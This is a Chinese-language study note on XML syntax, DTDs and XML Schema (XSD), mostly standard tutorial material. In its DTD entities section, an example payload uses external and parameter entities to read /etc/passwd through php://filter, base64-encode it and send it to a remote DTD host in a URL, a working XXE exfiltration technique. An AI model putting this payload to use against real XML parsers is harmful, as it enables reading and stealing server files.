# xml



## RFC文档

https://www.w3.org/TR/REC-xml



## xml



### xml结构

```
xml声明
xml根元素
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>
```

### xml特性

1. XML 标签对大小写敏感，标签` <Letter> `与标签 `<letter>` 是不同的。
2. xml属性值必须加引号

3. 在 XML 中，文档中的空格不会被删节。
4. xml以LF存储换行

### xml实体引用

| \&lt;   | <    | 小于   |
| ------- | ---- | ------ |
| \&gt;   | >    | 大于   |
| \&amp;  | &    | 和号   |
| \&apos; | '    | 单引号 |
| \&quot; | "    | 引号   |



## dtd

文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。

DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。

### demo

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>
<note>
  <to>George</to>
  <from>John</from>
  <heading>Reminder</heading>
  <body>Don't forget the meeting!</body>
</note>
```

### 以上 DTD 解释如下：

*!DOCTYPE note* (第二行)定义此文档是 *note* 类型的文档。

*!ELEMENT note* (第三行)定义 *note* 元素有四个元素："to、from、heading,、body"

*!ELEMENT to* (第四行)定义 *to* 元素为 "#PCDATA" 类型

*!ELEMENT from* (第五行)定义 *from* 元素为 "#PCDATA" 类型

*!ELEMENT heading* (第六行)定义 *heading* 元素为 "#PCDATA" 类型

*!ELEMENT body* (第七行)定义 *body* 元素为 "#PCDATA" 类型



### xml构建模块



所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：

- 元素
- 属性
- 实体
- PCDATA
- CDATA

```xml
元素：<a></a>
属性：<a href="attribute value"></aa>
实体：&lt;
PCDATA: <a href=""></a>,是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。即会被解析的文本数据
CDATA：单纯的文本数据


```



### DTD定义元素

语法：`<!ELEMENT 元素名称 类别>`或`<!ELEMENT 元素名称 (元素内容)>`

类别：EMPTY，ANY

demo:

```dtd
<!ELEMENT br EMPTY>空元素,不能有值，可以有属性 eg. <br></br>
<!ELEMENT any ANY>啥都可以
```



元素内容：`#PCDATA,子元素内容，元素`

子元素内容是`((message|body),test)`其中`(message|body)`是子元素内容

每个元素内容可以使用`*或?或+`来修饰，其中`*`代表元素可以出现任意次，?代表可以出现0次或1次，+代表至少出现一次，啥修饰符都没有代表只能出现一次

每个元素内容可以用`,`和`|`来连接，使用`,`代表且的意思,`a,b`意思为a出现且b出现，而`a|b`代表a出现或b出现



```
<!ELEMENT note (to,from,header,(message|body))>
```

上面的例子声明了："note" 元素必须包含 "to" 元素、"from" 元素、"header" 元素，以及非 "message" 元素既 "body" 元素。





```
<!ELEMENT note (#PCDATA|to|from|header|message)*>
```

上面的例子声明了："note" 元素可包含出现零次或多次的 PCDATA、"to"、"from"、"header" 或者 "message"。



### DTD定义属性

语法：`<!ATTLIST 元素名称 属性名称 属性类型 默认值>`

以下是*属性类型*的选项：

| 类型               | 描述                          |
| :----------------- | :---------------------------- |
| CDATA              | 值为字符数据 (character data) |
| (*en1*\|*en2*\|..) | 此值是枚举列表中的一个值      |
| ID                 | 值为唯一的 id                 |
| IDREF              | 值为另外一个元素的 id         |
| IDREFS             | 值为其他 id 的列表            |
| NMTOKEN            | 值为合法的 XML 名称           |
| NMTOKENS           | 值为合法的 XML 名称的列表     |
| ENTITY             | 值是一个实体                  |
| ENTITIES           | 值是一个实体列表              |
| NOTATION           | 此值是符号的名称              |

默认值参数可使用下列值：

| 值           | 解释           |
| :----------- | :------------- |
| 值           | 属性的默认值   |
| #REQUIRED    | 属性值是必需的 |
| #IMPLIED     | 属性不是必需的 |
| #FIXED value | 属性值是固定的 |



在属性名称中有特殊的值：`xml:lang和xml:space`  



### DTD 实体

**实体是用于定义引用普通文本或特殊字符的快捷方式的变量。**

**实体引用是对实体的引用。**

**实体可在内部或外部进行声明。**



#### 内部实体

语法：`<!ENTITY 实体名称 "实体的值">`

DTD 例子:

```dtd
<!ENTITY writer "Bill Gates">
<!ENTITY copyright "Copyright W3School.com.cn">
```

XML 例子:

```
<author>&writer;&copyright;</author>
```

我们使用 &writer对 上面定义的 writer实体进行了引用，到时候输出的时候 &writer就会被 “Bill Gates” 替换。

#### 外部实体

语法：

```
<!ENTITY 实体名称 SYSTEM "URI/URL">
```

例子：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo 
[
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >
]>
<creds>    
<user>&xxe;</user>    
<pass>mypass</pass>
</creds>
```



#### 参数实体

```xml
<!ENTITY % 实体名称 "实体的值">或者<!ENTITY % 实体名称 SYSTEM "URI">
```

参数实体只能在DTD中调用,调用方法:`%实体名称`



#### demo

```dtd
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://127.0.0.1/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```



## xsd

**XML Schema 是基于 XML 的 DTD 替代者。**

**XML Schema 描述 XML 文档的结构。**

**XML Schema 语言也称作 XML Schema 定义（XML Schema Definition，XSD）。**

XML Schema:

- 定义可出现在文档中的元素
- 定义可出现在文档中的属性
- 定义哪个元素是子元素
- 定义子元素的次序
- 定义子元素的数目
- 定义元素是否为空，或者是否可包含文本
- 定义元素和属性的数据类型
- 定义元素和属性的默认值以及固定值





### demo

```xml
<?xml version="1.0"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">

<xs:element name="note">
    <xs:complexType>
      <xs:sequence>
	<xs:element name="to" type="xs:string"/>
	<xs:element name="from" type="xs:string"/>
	<xs:element name="heading" type="xs:string"/>
	<xs:element name="body" type="xs:string"/>
      </xs:sequence>
    </xs:complexType>
</xs:element>

</xs:schema>
```



### 引用xsl

```xml
<?xml version="1.0"?>
<note
xmlns="http://www.w3school.com.cn"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://www.w3school.com.cn note.xsd">

<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>
```

引用`http://www.w3school.com.cn/note.xsd`



引用本地文件

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<shiporder orderid="889923"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:noNamespaceSchemaLocation="shiporder.xsd">
 <orderperson>George Bush</orderperson>
 <shipto>
  <name>John Adams</name>
  <address>Oxford Street</address>
  <city>London</city>
  <country>UK</country>
 </shipto>
 <item>
  <title>Empire Burlesque</title>
  <note>Special Edition</note>
  <quantity>1</quantity>
  <price>10.90</price>
 </item>
 <item>
  <title>Hide your heart</title>
  <quantity>1</quantity>
  <price>9.90</price>
 </item>
</shiporder>
```







### `<schema>`元素

`<schema> 元素`是每一个 XML Schema 的根元素

`<schema> 元素`可包含属性。一个 schema 声明往往看上去类似这样：

```
<?xml version="1.0"?>
 
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"
targetNamespace="http://www.w3school.com.cn"
xmlns="http://www.w3school.com.cn"
elementFormDefault="qualified">

...
...
</xs:schema>
```

```
xmlns:xs="http://www.w3.org/2001/XMLSchema"
```

显示 schema 中用到的元素和数据类型来自命名空间 "http://www.w3.org/2001/XMLSchema"。同时它还规定了来自命名空间 "http://www.w3.org/2001/XMLSchema" 的元素和数据类型应该使用前缀 xs



```
targetNamespace="http://www.w3school.com.cn" 
```

显示被此 schema 定义的元素 (note, to, from, heading, body) 来自命名空间： "http://www.w3school.com.cn"

```
xmlns="http://www.w3school.com.cn" 
```

指出默认的命名空间是 "http://www.w3school.com.cn"。

```
elementFormDefault="qualified" 
```

指出任何 XML 实例文档所使用的且在此 schema 中声明过的元素必须被命名空间限定。

更详细的介绍看https://www.jianshu.com/p/7f4cbcd9f09f



### xsd简单元素

简易元素指那些只包含文本的元素。它不会包含任何其他的元素或属性。

文本有很多类型。它可以是 XML Schema 定义中包括的类型中的一种（布尔、字符串、数据等等），或者它也可以是您自行定义的定制类型。



```
<xs:element name="xxx" type="yyy" />
```

此处 xxx 指元素的名称，yyy 指元素的数据类型。XML Schema 拥有很多内建的数据类型。



最常用的类型是：

- xs:string
- xs:decimal
- xs:integer
- xs:boolean
- xs:date
- xs:time

还有default和fixed两个属性分别代表着默认值和固定值

```
<xs:element name="color" type="xs:string" default="red"/>
<xs:element name="color" type="xs:string" fixed="red"/>

```



### xsd属性

**简易元素**无法拥有属性。假如某个元素拥有属性，它就会被当作某种复合类型。但是属性本身总是作为简易类型被声明的。

语法：`<xs:attribute name="xxx" type="yyy"/>`

可用属性：

```
name 元素名
type 元素类型
default 元素默认值
fixed 元素固定值
use 是否必选，默认情况是可选的，必选须将值设为required
```



 实例

这是带有属性的 XML 元素：

```
<lastname lang="EN">Smith</lastname>
```

这是对应的属性定义：

```
<xs:attribute name="lang" type="xs:string"/>
```



### xsd限定/Facets

限定（restriction）用于为 XML 元素或者属性定义可接受的值。对 XML 元素的限定被称为 facet。

#### 例子

demo:

```xml
<xs:element name="age">

<xs:simpleType>
  <xs:restriction base="xs:integer">
    <xs:minInclusive value="0"/>
    <xs:maxInclusive value="120"/>
  </xs:restriction>
</xs:simpleType>

</xs:element> 
```



或者作为一个属性



```xml
<xs:element name="car" type="carType"/>

<xs:simpleType name="carType">
  <xs:restriction base="xs:string">
    <xs:enumeration value="Audi"/>
    <xs:enumeration value="Golf"/>
    <xs:enumeration value="BMW"/>
  </xs:restriction>
</xs:simpleType>
```



#### 数据类型的限定

| 限定           | 描述                                                      |
| :------------- | :-------------------------------------------------------- |
| enumeration    | 定义可接受值的一个列表                                    |
| fractionDigits | 定义所允许的最大的小数位数。必须大于等于0。               |
| length         | 定义所允许的字符或者列表项目的精确数目。必须大于或等于0。 |
| maxExclusive   | 定义数值的上限。所允许的值必须小于此值。                  |
| maxInclusive   | 定义数值的上限。所允许的值必须小于或等于此值。            |
| maxLength      | 定义所允许的字符或者列表项目的最大数目。必须大于或等于0。 |
| minExclusive   | 定义数值的下限。所允许的值必需大于此值。                  |
| minInclusive   | 定义数值的下限。所允许的值必需大于或等于此值。            |
| minLength      | 定义所允许的字符或者列表项目的最小数目。必须大于或等于0。 |
| pattern        | 定义可接受的字符的精确序列。                              |
| totalDigits    | 定义所允许的阿拉伯数字的精确位数。必须大于0。             |
| whiteSpace     | 定义空白字符（换行、回车、空格以及制表符）的处理方式。    |





#### 通过枚举来限制值



```xml

<xs:element name="car">

<xs:simpleType>
  <xs:restriction base="xs:string">
    <xs:enumeration value="Audi"/>
    <xs:enumeration value="Golf"/>
    <xs:enumeration value="BMW"/>
  </xs:restriction>
</xs:simpleType>

</xs:element> 
```

#### 通过正则来限制值

```xml
<xs:element name="letter">

<xs:simpleType>
  <xs:restriction base="xs:string">
    <xs:pattern value="[a-z]"/>
  </xs:restriction>
</xs:simpleType>

</xs:element> 
```



#### 对空白字符的限制

```
xs:whiteSpace 可选值有preserve,replace,collapse
"preserve"， XML 处理器不会移除任何空白字符
"replace"，XML 处理器将移除所有空白字符（换行、回车、空格以及制表符）
 "collapse"，XML 处理器将移除所有空白字符（换行、回车、空格以及制表符会被替换为空格，开头和结尾的空格会被移除，而多个连续的空格会被缩减为一个单一的空格）
```



### xsd复合元素

**复合元素包含了其他的元素及/或属性。**

有四种类型的复合元素：

- 空元素
- 包含其他元素的元素
- 仅包含文本的元素
- 包含元素和文本的元素

**注释：**上述元素均可包含属性！



#### 例子

##### 只能使用一次的类型

```xml
<xs:element name="employee">
  <xs:complexType>
    <xs:sequence>
      <xs:element name="firstname" type="xs:string"/>
      <xs:element name="lastname" type="xs:string"/>
    </xs:sequence>
  </xs:complexType>
</xs:element>
```



对应的合法xml

```xml
<employee>
<firstname>John</firstname>
<lastname>Smith</lastname>
</employee>
```

仅有 "employee" 可使用所规定的复合类型



##### 能被多次使用的类型



或者

```xml
<xs:element name="employee" type="personinfo"/>

<xs:complexType name="personinfo">
  <xs:sequence>
    <xs:element name="firstname" type="xs:string"/>
    <xs:element name="lastname" type="xs:string"/>
  </xs:sequence>
</xs:complexType>
```

上面所描述的方法，那么若干元素均可以使用相同的复合类型

比如

```xml
<xs:element name="employee" type="personinfo"/>
<xs:element name="student" type="personinfo"/>
<xs:element name="member" type="personinfo"/>

<xs:complexType name="personinfo">
  <xs:sequence>
    <xs:element name="firstname" type="xs:string"/>
    <xs:element name="lastname" type="xs:string"/>
  </xs:sequence>
</xs:complexType>
```



##### 对复杂类型的扩展

```xml
<xs:element name="employee" type="fullpersoninfo"/>

<xs:complexType name="personinfo">
  <xs:sequence>
    <xs:element name="firstname" type="xs:string"/>
    <xs:element name="lastname" type="xs:string"/>
  </xs:sequence>
</xs:complexType>

<xs:complexType name="fullpersoninfo">
  <xs:complexContent>
    <xs:extension base="personinfo">
      <xs:sequence>
        <xs:element name="address" type="xs:string"/>
        <xs:element name="city" type="xs:string"/>
        <xs:element name="country" type="xs:string"/>
      </xs:sequence>
    </xs:extension>
  </xs:complexContent>
</xs:complexType>
```



#### 复合空元素

空的复合元素不能包含内容，只能含有属性。

为了定义无内容的类型，我们就必须声明一个在其内容中只能包含元素的类型，但是实际上我们并不会声明任何元素

```xml
<xs:element name="product">
  <xs:complexType>
    <xs:complexContent>
      <xs:restriction base="xs:integer">
        <xs:attribute name="prodid" type="xs:positiveInteger"/>
      </xs:restriction>
    </xs:complexContent>
  </xs:complexType>
</xs:element>
```

complexContent 元素给出的信号是，我们打算限定或者拓展某个复合类型的内容模型，而 integer 限定则声明了一个属性但不会引入任何的元素内容。





```xml
<product prodid="1345" />
```





#### 仅含元素



```xml
<xs:element name="person">
  <xs:complexType>
    <xs:sequence>
      <xs:element name="firstname" type="xs:string"/>
      <xs:element name="lastname" type="xs:string"/>
    </xs:sequence>
  </xs:complexType>
</xs:element>
```

请留意这个 `<xs:sequence>`。它意味着被定义的元素必须按上面的次序出现在 "person" 元素中。



```xml
<person>
<firstname>John</firstname>
<lastname>Smith</lastname>
</person>
```









#### 仅含文本复合元素

此类型仅包含简易的内容（文本和属性），因此我们要向此内容添加 simpleContent 元素。当使用简易内容时，我们就必须在 simpleContent 元素内定义扩展或限定

```xml
<xs:element name="某个名称">
  <xs:complexType>
    <xs:simpleContent>
      <xs:extension base="basetype">
        ....
        ....
      </xs:extension>     
    </xs:simpleContent>
  </xs:complexType>
</xs:element>
```

或

```xml
<xs:element name="某个名称">
  <xs:complexType>
    <xs:simpleContent>
      <xs:restriction base="basetype">
        ....
        ....
      </xs:restriction>     
    </xs:simpleContent>
  </xs:complexType>
</xs:element>
```

**提示：**请使用 extension 或 restriction 元素来扩展或限制元素的基本简易类型。



```
<shoesize country="france">35</shoesize>
```

下面这个例子声明了一个复合类型，其内容被定义为整数值，并且 "shoesize" 元素含有名为 "country" 的属性：

```xml
<xs:element name="shoesize">
  <xs:complexType>
    <xs:simpleContent>
      <xs:extension base="xs:integer">
        <xs:attribute name="country" type="xs:string" />
      </xs:extension>
    </xs:simpleContent>
  </xs:complexType>
</xs:element>
```

我们也可为 complexType 元素设定一个名称，并让 "shoesize" 元素的 type 属性来引用此名称（通过使用此方法，若干元素均可引用相同的复合类型）：

```xml
<xs:element name="shoesize" type="shoetype"/>

<xs:complexType name="shoetype">
  <xs:simpleContent>
    <xs:extension base="xs:integer">
      <xs:attribute name="country" type="xs:string" />
    </xs:extension>
  </xs:simpleContent>
</xs:complexType>
```



#### 带有混合内容的复合类型

设置xs:complex 的mixed属性为true

```xml
<xs:element name="letter">
  <xs:complexType mixed="true">
    <xs:sequence>
      <xs:element name="name" type="xs:string"/>
      <xs:element name="orderid" type="xs:positiveInteger"/>
      <xs:element name="shipdate" type="xs:date"/>
    </xs:sequence>
  </xs:complexType>
</xs:element>
```



#### 指示器

通过指示器，我们可以控制在文档中使用元素的方式。

有七种指示器：

Order 指示器：

- All
- Choice
- Sequence

Occurrence 指示器：

- maxOccurs
- minOccurs

Group 指示器：

- Group name
- attributeGroup name



##### Order指示器

`<all>` 指示器规定子元素可以按照任意顺序出现，且每个子元素必须只出现一次

当使用 `<all>` 指示器时，你可以把 `<minOccurs>` 设置为 0 或者 1，而只能把 `<maxOccurs>` 指示器设置为 1



`<choice>` 指示器规定可出现某个子元素或者可出现另外一个子元素（非此即彼）,如需设置子元素出现任意次数，可将` <maxOccurs>` 设置为 unbounded（无限次）



`<sequence> `规定子元素必须按照特定的顺序出现

```xml
<xs:element name="person">
  <xs:complexType>
    <xs:all>
      <xs:element name="firstname" type="xs:string"/>
      <xs:element name="lastname" type="xs:string"/>
    </xs:all>
  </xs:complexType>
</xs:element>

<xs:element name="person">
  <xs:complexType>
    <xs:choice>
      <xs:element name="employee" type="employee"/>
      <xs:element name="member" type="member"/>
    </xs:choice>
  </xs:complexType>
</xs:element>

<xs:element name="person">
  <xs:complexType>
    <xs:sequence>
      <xs:element name="firstname" type="xs:string"/>
      <xs:element name="lastname" type="xs:string"/>
    </xs:sequence>
  </xs:complexType>
</xs:element>
```



##### Occurrence 指示器

Occurrence 指示器用于定义某个元素出现的频率。

对于所有的 "Order" 和 "Group" 指示器（any、all、choice、sequence、group name 以及 group reference），其中的 maxOccurs 以及 minOccurs 的默认值均为 1

```xml
<xs:element name="person">
  <xs:complexType>
    <xs:sequence>
      <xs:element name="full_name" type="xs:string"/>
      <xs:element name="child_name" type="xs:string" maxOccurs="10" minOccurs="0"/>
    </xs:sequence>
  </xs:complexType>
</xs:element>
```

`<maxOccurs>` 指示器可规定某个元素可出现的最大次数,`<minOccurs>` 指示器可规定某个元素能够出现的最小次数

maxOccurs可以取：unbounded和数值

##### Group 指示器

Group 指示器用于定义相关的数批元素。

**元素组：**

元素组通过 group 声明进行定义：

```
<xs:group name="组名称">
  ...
</xs:group>
```

您必须在 group 声明内部定义一个 all、choice 或者 sequence 元素。

```xml
<xs:group name="persongroup">
  <xs:sequence>
    <xs:element name="firstname" type="xs:string"/>
    <xs:element name="lastname" type="xs:string"/>
    <xs:element name="birthday" type="xs:date"/>
  </xs:sequence>
</xs:group>

<xs:element name="person" type="personinfo"/>

<xs:complexType name="personinfo">
  <xs:sequence>
    <xs:group ref="persongroup"/>
    <xs:element name="country" type="xs:string"/>
  </xs:sequence>
</xs:complexType>
```

**属性组**



属性组通过 attributeGroup 声明来进行定义：

```xml
<xs:attributeGroup name="组名称">
  ...
</xs:attributeGroup>
```

```xml
<xs:attributeGroup name="personattrgroup">
  <xs:attribute name="firstname" type="xs:string"/>
  <xs:attribute name="lastname" type="xs:string"/>
  <xs:attribute name="birthday" type="xs:date"/>
</xs:attributeGroup>

<xs:element name="person">
  <xs:complexType>
    <xs:attributeGroup ref="personattrgroup"/>
  </xs:complexType>
</xs:element>
```



### `<any>`元素



`<any> `元素使我们有能力通过未被 schema 规定的元素来拓展 XML 文档！

```xml
<xs:element name="person">
  <xs:complexType>
    <xs:sequence>
      <xs:element name="firstname" type="xs:string"/>
      <xs:element name="lastname" type="xs:string"/>
      <xs:any minOccurs="0"/>
    </xs:sequence>
  </xs:complexType>
</xs:element>
```



### `<anyAttribute>`

`<anyAttribute>` 元素使我们有能力通过未被 schema 规定的属性来扩展 XML 文档！



```xml
<xs:element name="person">
  <xs:complexType>
    <xs:sequence>
      <xs:element name="firstname" type="xs:string"/>
      <xs:element name="lastname" type="xs:string"/>
    </xs:sequence>
    <xs:anyAttribute/>
  </xs:complexType>
</xs:element>
```



### xsd元素替换

添加substitutionGroup属性

```
<xs:element name="name" type="xs:string"/>
<xs:element name="navn" substitutionGroup="name"/>
```

在上面的例子中，"name" 元素是主元素，而 "navn" 元素可替代 "name" 元素。

请看一个 XML schema 的片段：

```
<xs:element name="name" type="xs:string"/>
<xs:element name="navn" substitutionGroup="name"/>

<xs:complexType name="custinfo">
  <xs:sequence>
    <xs:element ref="name"/>
  </xs:sequence>
</xs:complexType>

<xs:element name="customer" type="custinfo"/>
<xs:element name="kunde" substitutionGroup="customer"/>
```

有效的 XML 文档类似这样（根据上面的 schema）：

```
<customer>
  <name>John Smith</name>
</customer>
```

或类似这样：

```
<kunde>
  <navn>John Smith</navn>
</kunde>
```



### 阻止元素替换

为了将某个元素设置为不可替换，我们可以令block属性的值为`substitution`

```xml
<xs:element name="name" type="xs:string" block="substitution"/>

```

